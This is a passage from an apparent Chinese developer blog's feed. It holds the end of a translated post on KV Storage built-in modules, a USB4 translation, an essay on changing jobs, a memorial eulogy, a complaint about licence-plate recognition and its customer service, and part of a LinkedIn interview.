class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码中，<code>/path/to/kv-storage-polyfill.mjs</code> 被映射到了两种不同的资源 <code>std:kv-storage</code> 和一个 URL 地址 <code>/path/to/kv-storage-polyfill.mjs</code>，当浏览器解析到 import 时，如果浏览器支持 <code>std:kv-storage</code>，那么就会直接加载它，否则便会降级使用 <code>/path/to/kv-storage-polyfill.mjs</code>。</p><p>这里的妙处就在于，不支持 build-in 模块的浏览器在执行这句代码的时候，真正引用的是 <code>/path/to/kv-storage-polyfill.mjs</code>，这并非一种回退降级机制，所以说，build-in 是渐进增强的一种方案。</p><h3 id="如果浏览器连-type-module-都不支持呢？"><a href="#如果浏览器连-type-module-都不支持呢？" class="headerlink" title="如果浏览器连 type=module 都不支持呢？"></a>如果浏览器连 <code>type=module</code> 都不支持呢？</h3><p>为了说明今天可以使用内置模块同时仍然支持旧版浏览器，我已经整合了一个包含上述所有技术的<a href="https://rollup-built-in-modules.glitch.me/">Demo</a>：</p><ul><li>支持 modules、import maps 和 build-in 的浏览器不会加载任何不需要的代码</li><li>支持 modules 和 import maps，但是不支持 build-in 的浏览器需要加载 <a href="https://github.com/GoogleChromeLabs/kv-storage-polyfill">KV Storage Polyfill</a>（通过浏览器的 module loader 加载机制）</li><li>完全不支持的浏览器会通过 <code>&lt;script nomodule&gt;</code> 的方式加载 polyfill</li></ul><p>你可以通过打开 Devtool-&gt;sources 查看是否存在 <code>kv-storage</code> 来验证 build-in 模块是否被成功加载了：</p><p><img src="/../blogimgs/2019/03/13/kv-storage-build-in-module.png" alt="upload successful"></p><h3 id="给我们反馈"><a href="#给我们反馈" class="headerlink" title="给我们反馈"></a>给我们反馈</h3><p>这篇文章带着大家认识了 build-in 模块，相信你已经有点激动了！我们殷切期望开发者能够立即尝试使用 KV Storage，并给我们提出反馈意见。</p><p>如果你的网站正在使用 <code>localStorage</code>，你可以尝试切换到 KV Storage API，另外，你可以在 <a href="https://developers.chrome.com/origintrials/#/trials/active">KV Storage origin trial</a> 上注册，这样你就可以立马让你的切换生效了！让你所有的用户享受更好的性能吧，使用 Chrome 74+ 用户不会支付额外的 polyfill 下载开销。</p><hr><h3 id="译者有话说"><a href="#译者有话说" class="headerlink" title="译者有话说"></a>译者有话说</h3><p>这篇文章要阐述的内容还是挺易懂的，只不过逐字逐句翻译起来，反而读起来有点懵逼了。以前我基本都是看几篇文章把知识点消化以后，自己整理，不过为了翻译的「原滋原味」，还是忍了。</p><p>Chrome 拿出 12 年的一篇旧文，非说 localStorage 存在不好的性能问题，然后把 KV Storage 搬出来，这个逻辑虽然牵强了些，不过还是可以理解它的初衷——在 build-in module 这块进行初步的尝试。</p><p>其实未来这块会存在很多的问题，我稍微列几个：</p><ul><li>不同的浏览器如何保证底层实现是一致的？</li><li>为了更好的性能，是否 build-in 模块采用 C++ 编写，这样的模块在 Devtool 中还会展示出来么？</li><li>如何管理和更新 build-in 模块，这种方式确实存在很多优势，未来可以想象一定会有很多的 build-in modules，当某个库出现 bug 时如何更新？开发者如何知道当前浏览器是否支持某个 build-in 模块？</li><li>这种能力是否可以开放给开发者，而不是浏览器厂商来把持，毕竟厂商把持着，其动态性是很差的，开发者也会有具体的业务诉求来复用这个通道。</li></ul><p>目前 std 也还在 stage 1 阶段，未来是否能够保留下来，或者保留下来是否有很大的变化，我们还不知道。不过从这种特性来看，Web 的前途还是不错的。</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 译文 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> STD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>USB 4：目前所知道的一切</title>
      <link href="/blog/2019/03/11/USB-4-%E6%9C%80%E5%85%A8%E8%B5%84%E8%AE%AF/"/>
      <url>/blog/2019/03/11/USB-4-%E6%9C%80%E5%85%A8%E8%B5%84%E8%AE%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="https://www.tomshardware.com/news/usb-4-faq,38766.html">USB 4: Everything We Know So Far</a><br>原文时间：2019年3月7日12:45<br>翻译计划：<a href="https://github.com/barretlee/translation-plan">https://github.com/barretlee/translation-plan</a><br>翻译人员：<a href="https://www.barretlee.com/about/">小胡子哥</a></p></blockquote><p>请站稳扶好，新一代 USB 即将面世了！</p><p>USB Promoter 小组近期宣布新标准 “USB4”（官方拼写是木有空格的，本文会根据读者往常习惯增加一个空格，即 USB 4）将于今年年底发布，使用该技术的的产品可能会晚些时候到来。USB 4 带来了许多优势，包括更快的传输速度、更好的视频管理，以及可选的 Thunderbolt 3 接口兼容。</p><p><img src="/../blogimgs/2019/03/11/shutterstock-by-sergei-kardashev.png" alt="upload successful"></p><p>USB 3.2 发布了四种版本，USB 3.1 发布了两种类型，还有一系列不同类型和规格的其他连接器，新标准的出现也有些势不可挡，下面我们一起来看看 USB 4 的一些特性。</p><h3 id="USB-4-的主要优点"><a href="#USB-4-的主要优点" class="headerlink" title="USB 4 的主要优点"></a>USB 4 的主要优点</h3><p>相比之前的 USB 版本，USB 4 有下列三个重要优点：</p><ul><li><strong>最高 40 Gbps 的传输速度</strong>：采用双通道电缆，一些设备将可以达到与 Thunderbolt 3 相同的速度，接近 40Gbps；</li><li><strong>与 Thunderbolt 3 设备兼容</strong>：大部分 USB 4 接口与 Thunderbolt 3 设备兼容；</li><li><strong>对视频更好的资源分配</strong>：如果你正在使用 USB 4 接口同时传输视频和其他数据，接口将精确地分配带宽。譬如，视频只需要 20% 的带宽便可以驱动 1080p 的显示器（或集线器），那么另外 80% 的带宽将被分配给其他文件进行数据传输。</li></ul><h3 id="将使用-Type-C-端口"><a href="#将使用-Type-C-端口" class="headerlink" title="将使用 Type-C 端口"></a>将使用 Type-C 端口</h3><p>毫无疑问 USB 4 只能通过 Type-C 连接器使用，不要指望看到带有老式 Type-A 接口的 USB 4 设备或者集线器。这并不奇怪，你看，最近的苹果的 USB 供电器就是用的 Type-C。原因很简单，如果使用 Type-A 3.1 接口，速度和功率将会下降很多。</p><p><img src="/../blogimgs/2019/03/11/type-c-port.png" alt="upload successful"></p><h3 id="与-Thunderbolt-3-兼容"><a href="#与-Thunderbolt-3-兼容" class="headerlink" title="与 Thunderbolt 3 兼容"></a>与 Thunderbolt 3 兼容</h3><p>Intel 向 USB Promoter 小组提供 Thunderbolt 3 协议时，曾发布消息称，他们会尽可能保证具备 USB 4 端口的设备同时兼容 Thunderbolt 3 和 USB 4 设备，这对通过连接 eGPU（外部图形卡）来玩游戏的笔记本电脑用户而言是个福音。</p><p>由于 Thunderbolt 是 Intel 标准，在任何 AMD 驱动的计算机上都没有实现这个标准，所以你会看到市面上有许许多多的 Thunderbolt 3 eGPU，但是却很少有笔记本或台式机适配了它。Thunderbolt 3 并非开放标准，它需要额外的芯片才能驱动，其实现成本比标准 USB 要高很多。因此，如果你想要一个 eGPU 或者一个超高速的 Thunderbolt 3 储存驱动器，你可以选择的计算机是十分有限的。</p><p>制造商使用 USB 4 标准不需要向 Intel 支付任何版税，因此大规模采用将成为可能。不过，这里有个问题，兼容 Thunderbolt 并非 USB 4 标准的必要部分，制造商不一定会实现它，这就会导致，你购买的带有 USB 4 接口的电脑，可能与你的 <a href="https://www.tomshardware.com/reviews/razer-core-x-egpu,5525.html">Razer Core X</a> 图形底座不兼容。然而，USB Promoter 小组 CEO Brad Saunders 预计，大多数装有 USB 4 的电脑都会适配 Thunderbolt 3，</p><p>“我们电话联系了大部分的 PC 厂商，并表示殷切希望他们能够广泛向后兼容 Thunderbolt，目前他们大部分的设备已经将 USB 4 设计进去了，我预计大部分厂商都会接受我们的建议，但是也不排除有少数家伙忽略我们的建议。”</p><p>虽然 Saunders 对 PC 制造商在 USB 4 接口增加 Thunderbolt 3 兼容持乐观态度，但值得注意的是，任何厂商在推广时如果想说自家设备兼容 Thunderbolt 3 标准，都需要先经过 Intel 的认证，而这一认证过程十分严格，需要支付费用，所以不排除有部分厂商不兼容，或兼容得不够好（未经认证）。</p><h3 id="USB-4-的三种速度"><a href="#USB-4-的三种速度" class="headerlink" title="USB 4 的三种速度"></a>USB 4 的三种速度</h3><p>理论上 USB 4 可以达到 40Gbps，然而并非所有的 USB 设备或主机支持这个协议。Saunders 告诉我们实际会有三种速度：10Gbps、20Gbps 和 40Gbps。一般小点、便宜点的设备，如手机、Chromebook 等，会实现较低的速度标准；如果你在购买笔记本电脑时，想获得更快的 USB 4 连接，建议你查看下规格。</p><h3 id="在传输视频和数据时更好地共享带宽"><a href="#在传输视频和数据时更好地共享带宽" class="headerlink" title="在传输视频和数据时更好地共享带宽"></a>在传输视频和数据时更好地共享带宽</h3><p>USB 4 标准的一个重要部分是，在同时连接传输视频和数据时，能够动态调整可用的资源量。假设你使用 40Gbps 带宽的 USB 4 从外部 SSD 复制大量文件（视频+数据）输出到 4K 显示器，如果视频源需要 12.5Gbps 的带宽，那么剩下的 27.5Gbps 带宽将分配给备份驱动器以传输数据。</p><p>USB-C 引入了“替代模式”，即具备从 Type-C 接口传输视频数据到 DisplayPort 或 HDMI 的能力，不过目前的 3.x 规范并没有提供分隔资源的好办法，根据 Saunders 的说法，DisplayPort 模式可以将 USB 数据和视频之间的带宽分成 1:1，而 HDMI 模式则根本不允许同时使用 USB 传输数据和视频。</p><p>“USB SuperSpeed 规范没有足够的灵活性来控制连接器以组合的方式来管理数据和视频这两种不同的带宽分配，而 USB 4 为在不同应用程序类型之间获得更多的伸缩性提供了优化。”</p><p>当前许多扩展坞并未采用 USB 4 技术，而是采用的 DisplayLink 技术，该技术会压缩视频信号并将其转换为 USB 数据。未来大多数 USB 4 设备是否会这么处理，还不好说。</p><h3 id="所有的-USB-4-主机均支持-USB-供电器"><a href="#所有的-USB-4-主机均支持-USB-供电器" class="headerlink" title="所有的 USB 4 主机均支持 USB 供电器"></a>所有的 USB 4 主机均支持 USB 供电器</h3><p>目前有一些用于高功率供电的 USB Type-C 设备已经支持 USB 供电标准，但并非所有设备都支持。每个 USB 4 设备和主机都必须符合 USB 供电标准，这样可以实现更高的功率和更好的电源管理。</p><p>USB 供电理论上可以提供高达 100 瓦的功率，但充电设备不必支持这么大的功率也能正常充电。因此，我们无法保证所有的笔记本都能够提供 USB 4 所需要的额定功率来充电，但是我们可以呼吁它们遵循标准。</p><h3 id="老设备向后兼容"><a href="#老设备向后兼容" class="headerlink" title="老设备向后兼容"></a>老设备向后兼容</h3><p>值得高兴的是，USB 4 可以与 USB 3 和 USB 2 设备或端口配合使用。但是，很显然，你只能在传输中获得较弱设备的速度和能力。比如，当你使用 USB 4 设备连接到 USB 3.2 端口时， USB 设备将无法以 40Gbps 的速度传输，在 USB 2 端口也是同样的道理，最快只会有 USB 2 端口的最高速度和传输能力。</p><h3 id="你的旧数据线将以他们最快的速率工作"><a href="#你的旧数据线将以他们最快的速率工作" class="headerlink" title="你的旧数据线将以他们最快的速率工作"></a>你的旧数据线将以他们最快的速率工作</h3><p><img src="/../blogimgs/2019/03/11/old-cables-in-usb-4.png" alt="upload successful"></p><p>你现有的 USB 数据线和适配器都可以和 USB 4 配合使用，但是与上面类似，它们只能以数据线的最高额定速度运行，比如你使用 3.1 版本的数据线（传输速度为 5Gbps），当你与 USB 4 端口相连时，也只能达到 5Gbps。另外，如果想获得 Thunderbolt 3 支持，你得使用 Thunderbolt 3 数据线。</p><h3 id="不会来得很快"><a href="#不会来得很快" class="headerlink" title="不会来得很快"></a>不会来得很快</h3><p>USB Promoter 论坛计划在 2019 年年中发布 USB 4 规范，Saunders 告诉我们，新产品的开发周期一般是 12~18 个月，所以你不要指望在 2020 年以前看到任何基于该标准实现的产品。</p><p>对于支持 USB 4 的笔记本电脑和台式机，即使 18 个月也只是保守估计。你看，Type-C 的规格在 2014 年就宣布了，但是 USB Type-C 花了很长的时间才成为主流，并且现在好多笔记本电脑依然没有实现 Type-C 接口。</p><h3 id="将比-USB-3-2-的制造成本更高"><a href="#将比-USB-3-2-的制造成本更高" class="headerlink" title="将比 USB 3.2 的制造成本更高"></a>将比 USB 3.2 的制造成本更高</h3><p>大规模采用 USB 4 的一个障碍是它的成本太高，目前我们还不清楚 PC 和设备供应商增加 USB 4 的确切成本，但我们知道它需要采用比当前最新标准（USB 3.2）更加昂贵的组件。</p><p>Saunders 说，“我希望成本能够迅速降低，但是，我们猜测成本差异会将 USB 4 推向更高端的 PC，至少在开始的时候是这样的。”</p><h3 id="为什么官方称-USB-4-为“USB4”（无空格）"><a href="#为什么官方称-USB-4-为“USB4”（无空格）" class="headerlink" title="为什么官方称 USB 4 为“USB4”（无空格）"></a>为什么官方称 USB 4 为“USB4”（无空格）</h3><p>与过去版本的 USB 不同，新规范中的拼写少了一个空格，但是我依然相信大众还是会写成“USB 4”。USB Promoter 小组 CEO Brad Saunders 解释说，他期望删除空格可以让大家把重点放在版本号和品牌名称上。</p><p>“我想表达的是，未来我们并不打算引入 4.0、4.1、4.2 诸如此类的版本，保持简单就好”。</p><p>USB 3.x 规范有各种不同的版本，包括 USB 3.0、USB 3.1 Gen 1、USB 3.1 Gen 2 和 4 个不同版本的 USB 3.2，Saunders 期望未来在推广产品的时候，就用简单的诸如“SuperSpeed USB”这样的品牌，而不是带各种版本号。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>依然有很多关于 USB 4 我们不知道的地方，等 USB 4 规范在年底发布后我们会继续学习。但是无论如何，都不要指望在 2020 年之前能看到实现了 USB 4 规范的设备，2021 年估计才还有可能。</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 译文 </tag>
            
            <tag> USB 4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在转岗跳槽之前，你是否考虑好了这三样东西</title>
      <link href="/blog/2019/03/08/%E5%9C%A8%E8%BD%AC%E5%B2%97%E8%B7%B3%E6%A7%BD%E4%B9%8B%E5%89%8D%EF%BC%8C%E4%BD%A0%E6%98%AF%E5%90%A6%E8%80%83%E8%99%91%E5%A5%BD%E4%BA%86%E8%BF%99%E4%B8%89%E6%A0%B7%E4%B8%9C%E8%A5%BF/"/>
      <url>/blog/2019/03/08/%E5%9C%A8%E8%BD%AC%E5%B2%97%E8%B7%B3%E6%A7%BD%E4%B9%8B%E5%89%8D%EF%BC%8C%E4%BD%A0%E6%98%AF%E5%90%A6%E8%80%83%E8%99%91%E5%A5%BD%E4%BA%86%E8%BF%99%E4%B8%89%E6%A0%B7%E4%B8%9C%E8%A5%BF/</url>
      
        <content type="html"><![CDATA[<p>当一个人作出跳槽 or 转岗这一选择，大部分情况，原因不外乎人、事、钱——同事之间处不好了，场景不够了，钱少了；当然也存在偏私人的情况，比如兴趣、爱情、家庭、身体等等原因。下面就人、事和钱，稍微谈下我个人的观点。</p><p><img src="/../blogimgs/2019/03/08/one-person-alone.jpg" alt="upload successful"></p><h2 id="人"><a href="#人" class="headerlink" title="人"></a>人</h2><p>跟人相处简直就是一门艺术，这几年我懂得了一个道理：<strong>在公司里，几乎没有什么事情是沟通解决不了的。</strong></p><p>矛盾必然存在，每个人在不同时段身上都肩负着不一样的责任，有的人担子轻一点，有的重一点，要让所有人都幸福美满和谐相处，及时有效的沟通是解决矛盾的首要渠道。<strong>所谓沟通，就是让对方理解事情的起因经过结果，以及这件事情背后的人的处境，争取让对方结合自身情况站在己方的角度来思考问题，最后给出一个大家都能接受的处理办法。</strong></p><p>大多数矛盾便出在“说不清问题、看不清形势、摸不透对方、也不懂自己”这几点上。这里的根本原因有两点，一个是双方掌握的信息不够全面，在大的信息势差下，对事情的认知会出现巨大的差异；另外一点是，双方的水平不在一个维度上，或者价值观、人生观不在一个频道上，这种情况形成的矛盾容易上升到成人身攻击，比如心里甚至嘴上在骂这个人是傻逼。</p><p>信息势差是可以通过学习来弥补的，毕竟信息存在从高势能到低势能流动的趋势，想获取信息并不难；掌握了综合性更强的信息，便可以站在信息的权威角度去说（压）服（制）对方。而认知上的差异想强力磨平，容易产生隔膜，如果不具备降维打击的实力，就不要尝试从认知层面去改变一个人的论点，可以退而求其次，通过利益交换的方式来促成谈判，你损失的部分我来弥补，我损失的部分你来弥补，大家最后共赢，何乐而不为呢？</p><p>另外，如果已经对人产生了成见，只要他不会成为你工作的明显阻力，其实是无伤大雅的；除非关键性的人对你产生了关键性的负面影响。</p><h2 id="事"><a href="#事" class="headerlink" title="事"></a>事</h2><p>每个团队在历史的发展过程中或多或少会遇到些僧多粥少的事情，好的事情不可能总是落在某个人的头上，除非他的能力十分出众，非他莫属。所以，从心理上还是要接受这个事情。</p><p>同时，<strong>这里要去思考一个问题：到底什么是“好”的事情</strong>。你眼中的好，于团队或者公司而言，其实并没有那么好，甚至是次要的，或者是几乎意义的。</p><p>倘若你从未站在老板（的老板）的角度来思考过问题，那么你的视野是难以打开的，因为在你的小世界里，勺子永远是用来吃饭的，凳子永远是用来放屁股的，那几样东西难以发生质的变化。</p><p>产生变化的一个要点是“建立连接”，这是发现新大陆的原动力。不可能所有核心的事情都攥在你一个人的手里，此时你手头的事情很大概率就不是那么核心，但是为了变得重要，我们需要与核心的事情建立一定的连接，其实站在公司的层面去考虑这个问题，公司也是期望所有员工都能在关键的事情上齐心协力的。</p><p><strong>站在更高的业务视角和技术视角，把你我他都变成一颗颗棋子，观一观下一个棋面会演变成怎样的形式，想一想如何落子可以让自己活得更加长久，在变化中找到连接点，变中求变、变中求存。</strong></p><p>在一场战争中，极少数人在做战略规划，少数在做战略执行——做一场又一场的战役布局，真正参与到战斗的是前线的那波人，规模庞大。我们可以选择被安排到哪个战役（转岗），也可以选择被安排到哪场战争（跳槽），但前提是，我们需要明确自己有什么样技能，而这场战役需要什么样的技能，我们又能在这场战役中创造怎样的价值。</p><p>把视角拉长一点、远一点，结合自身和周边环境选择最有胜算的战役 or 战争，成功的几率会高一点。否则，你会发现，你跑到哪里，都是吃败仗，吃了败仗就跑，这跟逃兵有什么区别呢？另外，我们这辈子能打几场仗？</p><h2 id="钱"><a href="#钱" class="headerlink" title="钱"></a>钱</h2><p><strong>钱这块，我觉得那是奋斗的结果，而不是目标。</strong></p><p>从毕业至今，我从来没纠结过这个事情，我不会因为某家公司给的钱多一点（甚至多很多）就突然放下手头的事情，除非这个数额可以直接、明显地颠覆我的生活现状。在公司谈绩效、涨薪的时候，我也不会多说一句话，老板说怎样就是怎样，我很清楚自己做了些什么，产生了多少价值。当然，如果老板忽略我的价值，我也不会多一句废话，我会直接选择放弃他。</p><p>钱是物质基础，当然重要，但是在做选择的时候，请把它的优先级放低一点，它很容易影响人的判断，影响我们对价值的判断。</p><hr><p>每个人对这三个东西的认知都是不一样的，以上，仅供参考。</p><p>题图：<a href="https://unsplash.com/photos/qH7nLsK_IjE">https://unsplash.com/photos/qH7nLsK_IjE</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 记事本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跳槽 </tag>
            
            <tag> 转岗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>祭恩师肖公文</title>
      <link href="/blog/2019/03/04/%E7%A5%AD%E6%81%A9%E5%B8%88%E8%82%96%E5%85%AC%E6%96%87/"/>
      <url>/blog/2019/03/04/%E7%A5%AD%E6%81%A9%E5%B8%88%E8%82%96%E5%85%AC%E6%96%87/</url>
      
        <content type="html"><![CDATA[<p>这一生中不是亲人胜似亲人的人，并不多，2015 年<a href="/blog/2015/09/11/prayer-the-bicycle-repairing-man/">走了一位</a>，而今又是一位。呜呼哀哉！</p><div style="font-family:STKaiti,KaiTi,serif;background:#000;color:#fff;padding:30px 20px">  <p>哀维：</p>  <p style="text-indent:2em">老师辞世得太突然，没有给任何人心理准备，当然，这种事情也没办法给人心理准备。  </p>  <p style="text-indent:2em">老师没有在课堂上正儿八经教过我的书，不过，从桃李小学相识，到升初中时的家庭补习班，再到高考毕业后帮老师带学生，我与老师建立了非常深厚的感情，这种感情，用老师的话来说：“我比了解我两个儿子还了解你”，同样，在我的心里，也有着父亲的影子。  </p>  <p style="text-indent:2em">每次回家，我都会去洗马路一趟，以前是一个人，后来带着女朋友（准媳妇儿），再后来带着媳妇儿；去年过年回家，本想领着孩子一起看望老师，天太冷，只领着媳妇儿匆匆地坐了十几分钟。没承想，那一别，竟会是永别！</p>  <p style="text-indent:2em">听到老师辞世的消息，我怎么都不敢相信，直到拨通老师的电话，听到老师弟弟的亲口确认，顷刻，我的心情变得十分沉重。在我的脑子里，我只背得四个电话号码：我的、我媳妇的、我爸的，和老师的。</p>  <p style="text-indent:2em">老师在十里八乡都是出了名的，绝对的名师！在我的心里，你是我的启蒙老师，是我精神寄托的重要港湾，你走了，很多话，我只能对着天堂倾诉。</p>  <p style="text-align:right;">- 学生李靖，叩首再拜！</p></div><p>请珍惜生命中遇到的所有的人！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 祈祷 </tag>
            
            <tag> 祭文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>客服兜底的产品设计案例</title>
      <link href="/blog/2018/12/24/%E6%9C%8D%E5%85%9C%E5%BA%95%E7%9A%84%E4%BA%A7%E5%93%81%E8%AE%BE%E8%AE%A1%E6%A1%88%E4%BE%8B/"/>
      <url>/blog/2018/12/24/%E6%9C%8D%E5%85%9C%E5%BA%95%E7%9A%84%E4%BA%A7%E5%93%81%E8%AE%BE%E8%AE%A1%E6%A1%88%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p>厂里车位不算多，人车位比估摸着 10:1，想把车子停在厂子里面，需要在园区车位大抽和小抽中碰碰运气，我的运气不算好，没中签，故而在公司附近的小区租了一个车位。这是背景。</p><p>几乎每天进小区，都要忍受一件令人郁闷的事情——车牌识别错误。普通的车牌识别错误我是（暂且）可以忍受的，而把车牌的第一个字符（肯定是字母）识别成数字，我就特别不能忍了，毕竟是程序员出身，这种明显的 BUG 应该在业务层逻辑就清理干净，绝不会走到测试环节，更加不会暴露给用户，然而这个大 BUG 却每天影响着我进小区车库，简直不能忍。</p><p>“嘿，你过来”，我面向着门卫，指着门禁识别屏反问道，“你见过车牌第一位是 0 的么？”，每次进来都把 D 识别成 0，“这个问题我反馈过很多次了，你们能不能修复一下呀！”，我差点就把怎么修复都说出来了。门卫连连点头，已经不记得这是第几次点头了。</p><p>毕竟不是自己所在的小区，如果是自己的，物业经理就等着被喷吧，花了业主们的钱，买回来的就是这么个垃圾，我心里嘀咕着。</p><p>出门的时候，偶然看到门禁识别系统后侧有一块滚动的文字屏，上面写着这家公司的客服电话 400-700-4008（贴出来的目的，是让业主们防着点这家垃圾公司）。作为一个热心的小区车位租客（其实我下个月就要走了，小抽中奖了~），我还是打了一个电话过去了。</p><h3 id="客服"><a href="#客服" class="headerlink" title="客服"></a>客服</h3><p>“您好，报一个你们产品的问题”。</p><p>“您说”。</p><p>“我的车牌是‘浙D’开头，但是你们的系统总是把他识别成‘浙0’”。</p><p>“这个问题我们知道，修复了，升级系统就可以了，请问还有其他问题么”。</p><p>当时我就有点愤慨，“那我们小区的问题什么时候可以升级呢？”，那厮要站在我面前，我定会一口唾沫星子淹死他。</p><p>客服连连答道：“你联系下浙江这边的技术人员就行了，有报修我们才回去修复，其他小区可能没有这个问题”。</p><p>“没有这个问题？这是个算法识别问题，只要存在，那就是普遍存在，怎么可能没有问题！”，顿时，我的火气就来了，以为我不懂技术么，“你们自己的产品卖给了哪些小区，当前的版本是多少，你敢说你们不知道？既然知道，也知道有问题，为什么我打电话给你们总部，还让我去分部找人修复，是个什么鬼逻辑？竟然还用‘其他小区没有这个问题’来搪塞我！”</p><p>客服语塞了几秒，回到，“稍后我让我的同事找你”。</p><p>“现在！立刻！让你的主管找我！”，垃圾的产品，加上垃圾的售后，让我跟吃了火药一样。</p><p>当然，我没去联系他们杭州分部的技术人员，最后是他们的杭州负责人联系了我。</p><h3 id="产品和服务"><a href="#产品和服务" class="headerlink" title="产品和服务"></a>产品和服务</h3><p>后文我也不继续说了，回过头，我们来分析这家公司的几个产品和服务问题，渣物业问题先略过。</p><p><strong>产品严重业务逻辑漏洞</strong>，这个锅，程序员铁定是要背了，当然也不排除，这是从淘宝上花了 30 块钱买来的识别程序，毕竟车牌识别不是什么复杂的技术，代码随处就能捡到。</p><p><strong>产品升级策略</strong>，报修了才修复，不报修不修复，这个逻辑真的跟屎一样。在这个万物互联的时代，还说出这么不负责任的话，可以看出这家小公司为了减少在线升级风险而把责任推给售后做了多么大的妥协，我想，这家公司的售后经理真的可以下岗了。</p><p><strong>客服反馈链路问题</strong>，一个十分明确的 BUG，只要稍微收集用户信息便可以直接定位的问题，非得把它当做一个皮球，踢来踢去，反馈给总部踢到了分部，如果是硬性流程也就忍了，结果客户发个脾气，流程就可以变通，这特么是个什么逻辑呢？技术偷懒也就算了，售后也偷懒，一个产品十几万卖出去，维护水平如此低下，不是垃圾也胜似垃圾了。</p><h3 id="后文"><a href="#后文" class="headerlink" title="后文"></a>后文</h3><p>最后，杭州负责人联系我，首先问我物业知不知道这个问题，意思是所有问题物业来报修，很显然，又被我喷了回去，估计他们隔着电话都能感受到一口唾沫星子。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客服兜底 </tag>
            
            <tag> 产品设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linkedin 采访</title>
      <link href="/blog/2018/11/27/linkedin-%E9%87%87%E8%AE%BF/"/>
      <url>/blog/2018/11/27/linkedin-%E9%87%87%E8%AE%BF/</url>
      
        <content type="html"><![CDATA[<p>Linkedin 每年都会搞一个「最强档案」的榜单，今年也不例外；很荣幸的是，<a href="https://www.linkedin.com/pulse/%E4%BB%96%E4%BB%AC%E6%98%AF2018%E5%B9%B4%E6%9C%80%E5%8F%97%E7%9E%A9%E7%9B%AE%E7%9A%84%E8%81%8C%E5%9C%BA%E4%BA%BA-jian-lu-%E9%99%86%E5%9D%9A-/">我上榜了</a>，发榜之前官方的同学邮件对我做了一次采访，下面我把问题和回复发出来，以供参考。</p><h3 id="一、人生-x2F-职业照片"><a href="#一、人生-x2F-职业照片" class="headerlink" title="一、人生&#x2F;职业照片"></a>一、人生&#x2F;职业照片</h3><blockquote><p>您可以选择任何有代表性的人生&#x2F;职业阶段的照片提供（并附以简单的说明），张数不限。</p></blockquote><ul><li>第一家实习的公司——百度。奎科大厦的伙食实在太差，加上北京（生活和购房）压力大，有离开北京的想法。</li><li>第一次被邀请出去讲我在阿里的成长。</li><li>2017~2018，结婚了，有房了，有车了，有娃了，为美好生活而继续努力。</li></ul><p>图略。中间省略了 4-5 项。</p><h3 id="二、职业故事"><a href="#二、职业故事" class="headerlink" title="二、职业故事"></a>二、职业故事</h3><blockquote><p>您可以以一段文字简单介绍您的职业故事，包括但不限于创业故事，职业选择，职业转折等任何您想分享给访客的个人故事，字数不限。</p></blockquote><p>我在大二的时候就已经初步明确了自己的职业发展方向——前端。毕业四年时间，我从一个懵懂的新人成长为领域专家，再回首要感谢很多很多的人。在这里给自己的成长做一个小结：</p><ul><li>保持好奇和对知识的饥渴</li><li>培养理性思维习惯，辩证看待所有的一切</li><li>学会让别人看见自己，也学会从别人那里看见自己</li><li>不断地升级自己的圈子，跟比你「强」的人交流</li><li>认真做人，踏实做事，保持冷静和风趣</li></ul><p>生活从来都是公平的，这个世上没有蠢材，只有不勤奋的人。</p><h3 id="三、问答环节"><a href="#三、问答环节" class="headerlink" title="三、问答环节"></a>三、问答环节</h3><blockquote><p>① 至今为止，您认为职业生涯中对您来说最重要的一段经历&#x2F;一件事是什么？为什么？对您产生了怎样的影响？</p></blockquote><p>作为一个技术新人时，我负责一块比较重要且特殊的业务。它的受众很多，每天都有上亿人使用；系统的复杂度不是很高，但风险很大，需要跟很多人交涉。我接手之时业务发生了一些变化，作业量很大，来自业务方的压力和技术上的挑战也很大。那段时间连续一两个月加班到晚上 1 点左右，回家以后还有可能收到业务方的电话。</p><p>有一天晚上 11 点钟，整层楼只剩下我和主管在优化一个技术细节问题。那天晚上我突然疲惫到泣不成声，主管在旁边。等我哭的差不多的时候，他告诉我：“成长是很累，但是人可以累，心不能累”。</p><p>这几年我一直记着这段往事，也把那句话刻在了心里。从那以后不管是工作还是生活，我都尽量保持良好的心态，每每感觉心累的时候都会想办法调节自己。</p><p>一年半以后，我觉得自己在那块业务上已经做到了极致，主动换到了另一块业务。那时回首，感觉像是在告别曾经的自己。</p><blockquote><p>② 您认为成功的定义是什么？职业上“成功“的定义又应该是什么？</p></blockquote><p>站在公司的角度，我认为成功的定义就是真正服务好客户，做到公司、员工和客户三者共赢。</p><p>站在个人的角度，每个阶段对成功的理解都在变化。起初，我认为成功就是成为一个厉害的人，让身边的人都高看自己一眼；后来，我觉得成功是在预计的时间内按计划完成了自己想要做的事情；现在，我觉得成功是能够照顾好家庭，支持好业务，服务好团队。而未来，可能还在变化。</p><blockquote><p>③ 如果您只能给年轻的职场人一个建议，您会给的建议是？ </p></blockquote><p>做一个有底蕴的人。开拓自己的眼界，提升自己的技能，夯实自己的基础。</p><p>未来我们会遇到各种各样棘手的问题，有来自家庭的，但更多的是来自工作中的。如果自己的认知一直处于低水平，甚至没有意识到自己的认知处于低水平，你会发现自己处理问题的方法、效率和结果都不尽人意。不断提升自己思考的维度，不断给自己设定「下一个目标」，勇往直前！</p><blockquote><p>④ 